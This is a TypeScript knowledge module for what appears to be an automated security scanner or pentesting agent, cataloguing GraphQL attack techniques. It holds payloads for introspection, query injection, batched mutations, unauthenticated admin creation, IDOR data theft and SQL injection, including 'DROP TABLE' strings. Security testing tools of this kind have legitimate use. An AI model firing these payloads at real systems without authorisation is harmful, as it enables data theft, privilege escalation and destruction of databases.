/**
 * GraphQL Knowledge
 */
import type { TechKnowledge } from '../types';

export const GRAPHQL_KNOWLEDGE: TechKnowledge = {
  id: 'graphql',
  name: 'GraphQL',
  category: 'api',

  fingerprints: {
    headers: {
      'content-type': /application\/graphql/i,
    },
    cookies: [],
    bodyPatterns: [
      /"errors":\s*\[\s*\{.*"message"/,
      /"data":\s*\{/,
      /GraphQL/i,
      /__schema/,
      /__typename/,
    ],
    urlPatterns: [
      /\/graphql/i,
      /\/graphiql/i,
      /\/playground/i,
      /\/altair/i,
      /\/api\/graphql/i,
    ],
    errorPatterns: [
      /Syntax Error.*GraphQL/,
      /Cannot query field/,
      /Unknown argument/,
      /did you mean/i,  // GraphQL field suggestions
    ],
  },

  commonEndpoints: [
    '/graphql',
    '/graphiql',
    '/playground',
    '/altair',
    '/api/graphql',
    '/v1/graphql',
    '/query',
    '/gql',
  ],

  vulns: {
    injection: {
      techniques: [
        {
          name: 'Introspection Query',
          description: 'Query schema structure to discover API surface',
          how: 'Send __schema query to enumerate types, queries, mutations',
          context: 'When introspection is enabled (often in dev/staging)',
          examples: [
            '{ __schema { types { name fields { name } } } }',
            '{ __schema { queryType { fields { name args { name } } } } }',
          ],
          payloads: [
            '{ __schema { types { name } } }',
            '{ __schema { queryType { name } mutationType { name } } }',
            '{ __schema { types { name kind fields { name type { name kind } } } } }',
            '{ __type(name: "User") { name fields { name type { name } } } }',
          ],
          indicators: {
            vulnerable: [
              '__schema in response',
              'types array returned',
              'queryType/mutationType exposed',
            ],
            notVulnerable: [
              'Introspection disabled',
              'Cannot query field "__schema"',
              'Introspection is not allowed',
            ],
          },
        },
        {
          name: 'Query Injection',
          description: 'Inject additional queries via variable manipulation',
          how: 'Break out of variable context to inject queries',
          context: 'When variables are string-concatenated into queries',
          examples: [
            '} { users { password } } { user(id: "1',
            '") { secretField } anotherQuery { users { id',
          ],
          payloads: [
            '} { __schema { types { name } } }',
            '") { users { password } } x { y(z: "',
          ],
        },
        {
          name: 'Batching Attack',
          description: 'Send multiple queries in one request for auth bypass',
          how: 'Array of queries where one is privileged operation',
          context: 'When authorization is checked per-request not per-query',
          examples: [
            '[{"query": "{ me { id } }"}, {"query": "mutation { deleteUser(id: 1) }"}]',
          ],
          payloads: [],
        },
      ],
      payloads: [
        '{ __schema { types { name } } }',
        '{ __schema { queryType { fields { name } } } }',
        '{ __schema { mutationType { fields { name } } } }',
        '{ __type(name: "Query") { fields { name args { name type { name } } } } }',
      ],
      indicators: {
        vulnerable: [
          'Schema exposed via introspection',
          'Sensitive fields visible',
          'Mutations accessible without auth',
        ],
        notVulnerable: [
          'Introspection disabled',
          'Field-level authorization',
          'Rate limiting on queries',
        ],
      },
      adaptiveStrategy: 'Start with introspection to map API. If disabled, use field suggestion errors. Once schema known, test mutations for auth bypass.',
    },

    auth_bypass: {
      techniques: [
        {
          name: 'Query Aliasing',
          description: 'Use aliases to bypass rate limiting or access controls',
          how: 'Execute same query multiple times with different aliases',
          context: 'When controls are per-field-name not per-execution',
          examples: [
            '{ a: user(id: "1") { id } b: user(id: "2") { id } c: user(id: "3") { id } }',
          ],
          payloads: [],
        },
        {
          name: 'Mutation Auth Bypass',
          description: 'Execute privileged mutations without authentication',
          how: 'Call admin mutations directly after discovering via introspection',
          context: 'When mutation-level auth is missing',
          examples: [
            'mutation { createAdmin(username: "hacker") { id } }',
            'mutation { updateUserRole(userId: "1", role: "admin") }',
          ],
          payloads: [],
        },
        {
          name: 'Field-Level Auth Bypass',
          description: 'Access sensitive fields through different query paths',
          how: 'Query sensitive data through relations instead of direct queries',
          context: 'When field auth varies by query path',
          examples: [
            '{ posts { author { password_hash } } }',
            '{ me { orders { user { creditCard } } } }',
          ],
          payloads: [],
        },
      ],
      payloads: [],
      indicators: {
        vulnerable: [
          'Sensitive data returned',
          'Mutation executed without auth',
          'Admin operation successful',
        ],
        notVulnerable: [
          'NOT_AUTHENTICATED error',
          'FORBIDDEN error',
          'Insufficient permissions',
        ],
      },
      adaptiveStrategy: 'After introspection, identify admin mutations. Try calling directly. If blocked, try accessing sensitive fields through relation chains.',
    },

    idor: {
      techniques: [
        {
          name: 'Direct Object Query',
          description: 'Query objects by ID without ownership check',
          how: 'Use discovered queries like user(id: X) with other users IDs',
          context: 'When queries accept ID arguments without auth check',
          examples: [
            '{ user(id: "other-user-id") { email password } }',
            '{ order(id: 123) { items total creditCard } }',
          ],
          payloads: [],
        },
        {
          name: 'Nested Object Access',
          description: 'Access objects through nested relations',
          how: 'Traverse object graph to access unauthorized data',
          context: 'When relation auth differs from direct query auth',
          examples: [
            '{ products { seller { bankAccount } } }',
          ],
          payloads: [],
        },
      ],
      payloads: [
        '1', '2', '0', 'admin',
      ],
      indicators: {
        vulnerable: [
          'Other user data returned',
          'No FORBIDDEN error',
          'Sensitive fields exposed',
        ],
        notVulnerable: [
          'null returned for unauthorized',
          'FORBIDDEN error',
          'Access denied',
        ],
      },
      adaptiveStrategy: 'Use introspection to find ID-based queries. Test with sequential IDs or known user IDs. Check nested relations for auth gaps.',
    },

    sqli: {
      techniques: [
        {
          name: 'Resolver SQL Injection',
          description: 'Inject SQL through GraphQL arguments',
          how: 'Arguments passed to resolvers may reach raw SQL',
          context: 'When resolvers use raw queries with GraphQL args',
          examples: [
            '{ users(filter: "\' OR 1=1--") { id } }',
            '{ search(query: "\'; DROP TABLE users;--") { results } }',
          ],
          payloads: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "'; SELECT * FROM users--",
            "' UNION SELECT username,password FROM users--",
          ],
        },
      ],
      payloads: [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "'; DROP TABLE--",
        "' UNION SELECT NULL--",
      ],
      indicators: {
        vulnerable: [
          'SQL error in GraphQL error message',
          'Unexpected data returned',
          'Database error',
        ],
        notVulnerable: [
          'Parameterized query',
          'Input validation error',
          'Type coercion error',
        ],
      },
      adaptiveStrategy: 'Test string arguments in search/filter queries. GraphQL type system may provide some protection, focus on String and custom scalar types.',
    },
  },

  notes: [
    'Always try introspection first - it maps the entire API',
    'Check for GraphiQL/Playground - often left enabled in production',
    'Field suggestions in errors can leak schema info even with introspection disabled',
    'Batch queries can bypass per-request rate limiting',
    'Nested queries can cause DoS (query depth attacks)',
    'Check both query and mutation types for sensitive operations',
    'Look for subscription endpoints for real-time data leaks',
  ],

  relatedTech: ['express', 'nodejs', 'apollo', 'hasura', 'prisma'],
};

/**
 * Common GraphQL introspection queries
 */
export const GRAPHQL_INTROSPECTION_QUERIES = {
  // Full schema introspection
  fullSchema: `{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields {
        name
        description
        args { name type { name kind } }
        type { name kind ofType { name kind } }
      }
    }
  }
}`,

  // Quick type enumeration
  typeNames: `{ __schema { types { name kind } } }`,

  // Query fields only
  queryFields: `{ __schema { queryType { fields { name args { name } } } } }`,

  // Mutation fields only
  mutationFields: `{ __schema { mutationType { fields { name args { name } } } } }`,

  // Specific type details
  typeDetails: (typeName: string) => `{ __type(name: "${typeName}") { name fields { name type { name kind ofType { name } } } } }`,
};
